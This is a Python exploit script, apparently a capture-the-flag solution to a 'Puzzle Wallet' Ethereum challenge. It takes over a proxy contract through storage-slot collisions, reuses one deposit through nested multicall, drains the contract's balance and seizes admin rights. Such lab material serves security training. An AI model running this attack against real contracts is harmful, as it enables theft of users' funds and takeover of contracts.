#!/usr/bin/env python3

import sys
from ethpwn import *
from time import sleep

"""

proxy contract: 0xf34B09aef134B8C198A816e27588C53cdEb76070
--> delegates to implementation (at slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc): 0x79c6bcf904ad93c36837d327bdb3ba04c00936ed

proxy                                  implementation
----------------------------------------------------------------------------------
address public pendingAdmin;           address public owner;
address public admin;                  uint256 public maxBalance;
                                       mapping(address => bool) public whitelisted;
                                       mapping(address => uint256) public balances;


EXPLOIT PLAN:
proposeNewAdmin will make us owner (because it collides with proxy.pendingAdmin)
addToWhitelist (onlyoner) will make us whitelisted
--- now contract.balance needs to be zero
multicall(
    deposit,
    multicall(deposit)
)
execute (onlywhitelisted) allows us to withdraw all funds
setMaxBalance (onlywhitelisted) will make us admin (because logic.maxBalance collides with proxy.admin)
"""

context.log_level = 'DEBUG'

MY_WALLET = get_wallet_by_name('Laptop CTF Metamask')
assert MY_WALLET is not None
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

PROXY_ADDR = sys.argv[1] if len(sys.argv) > 1 else '0x281c8EEb88489162A87E1Ae8462D6B8534364703'
KILL_AMOUNT = context.w3.eth.get_balance(PROXY_ADDR)

print("KILL_AMOUNT: {} [{} ether]".format(KILL_AMOUNT, context.w3.from_wei(KILL_AMOUNT, 'ether')))

CONTRACT_METADATA.add_contracts_from_solidity_files(['./exploit_puzzle_wallet.sol'])

target = CONTRACT_METADATA['PuzzleProxy'].get_contract_at(PROXY_ADDR)

tx_hash, tx_receipt = transact(target.functions.proposeNewAdmin(context.default_from_addr))
print(f"Received proposeNewAdmin receipt (block_number={tx_receipt['blockNumber']})")
sleep(3)

tx_hash, tx_receipt = transact(target.functions.addToWhitelist(context.default_from_addr))
print(f"Received addToWhitelist receipt (block_number={tx_receipt['blockNumber']})")
sleep(3)


deposit_calldata = target.encodeABI(fn_name="deposit")
multicall_calldata = target.encodeABI(fn_name="multicall", args=[[deposit_calldata,]])

tx_hash, tx_receipt = transact(
    target.functions.multicall([deposit_calldata, multicall_calldata]),
    value=KILL_AMOUNT  # deposit KILL_AMOUNT, so we can withdraw KILL_AMOUNT*2, draining the contract
)
print(f"Received multicall receipt (block_number={tx_receipt['blockNumber']})")
sleep(3)

tx_hash, tx_receipt = transact(target.functions.execute(MY_WALLET.address, KILL_AMOUNT * 2, "0x"))
print(f"Received execute receipt (block_number={tx_receipt['blockNumber']})")
sleep(3)

tx_hash, tx_receipt = transact(
    target.functions.setMaxBalance(int(MY_WALLET.address, 16))
)
print(f"Received setMaxBalance receipt (block_number={tx_receipt['blockNumber']})")
sleep(3)